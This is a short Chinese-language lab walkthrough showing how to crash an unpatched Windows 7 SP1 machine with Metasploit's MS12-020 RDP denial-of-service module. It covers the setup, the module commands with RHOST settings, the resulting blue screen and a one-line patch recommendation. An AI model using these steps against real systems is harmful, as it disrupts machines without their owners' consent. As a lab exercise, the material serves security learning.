## 一、漏洞简介

MS12-020全称Microsoft Windows远程桌面协议RDP远程代码执行漏洞

kail利用msf工具对MS12-020漏洞进行渗透测试：

## 二、实验环境

工具：metasploit

靶机两台：windows 7sp1和kali2020

攻击机IP地址：192.168.29.129

被攻击机IP地址：192.168.29.128

实验条件：两台机子可以互通的，并且windows 7sp1（无补丁）开启了3389端口，防火墙是关闭的。

## 三、实现步骤

1、首先打开kali主机，打开终端，输入“msfconsole“，进入Metasploit控制台

![1621834839_60ab3c57a5fac7bd43389.png!small?1621834840825](https://image.3001.net/images/20210524/1621834839_60ab3c57a5fac7bd43389.png!small?1621834840825)

2、搜索ms12-020漏洞利用模块，找到auxiliary/dos/windows/rdp/ms12_020_maxchannelids

![1621834861_60ab3c6d1f36c51e302a6.png!small](https://image.3001.net/images/20210524/1621834861_60ab3c6d1f36c51e302a6.png!small)

3、使用模块 use + auxiliary/dos/windows/rdp/ms12_020_maxchannelids利用这个漏洞

![1621834884_60ab3c84ecd0423b0f3bf.png!small?1621834886085](https://image.3001.net/images/20210524/1621834884_60ab3c84ecd0423b0f3bf.png!small?1621834886085)

4、查看当前模块所需配置项 show options ，RHOST 需设为远程靶机的IP地址

![1621834931_60ab3cb377745be1a74a7.png!small?1621834932573](https://image.3001.net/images/20210524/1621834931_60ab3cb377745be1a74a7.png!small?1621834932573)

5、设置配置项，如set RHOST xxx.xxx.xx.x(为攻击目标的IP地址)

![1621834945_60ab3cc11fe1caceea888.png!small?1621834946013](https://image.3001.net/images/20210524/1621834945_60ab3cc11fe1caceea888.png!small?1621834946013)

6、实施攻击 exploit 或者run

![1621834956_60ab3cccd2d86099bb765.png!small](https://image.3001.net/images/20210524/1621834956_60ab3cccd2d86099bb765.png!small)

7、查看windows7sp1，成功蓝屏并且重启

![1621834976_60ab3ce010644951da4e8.png!small?1621834976981](https://image.3001.net/images/20210524/1621834976_60ab3ce010644951da4e8.png!small?1621834976981)

## 修复方案：

安装相应的补丁

  

  

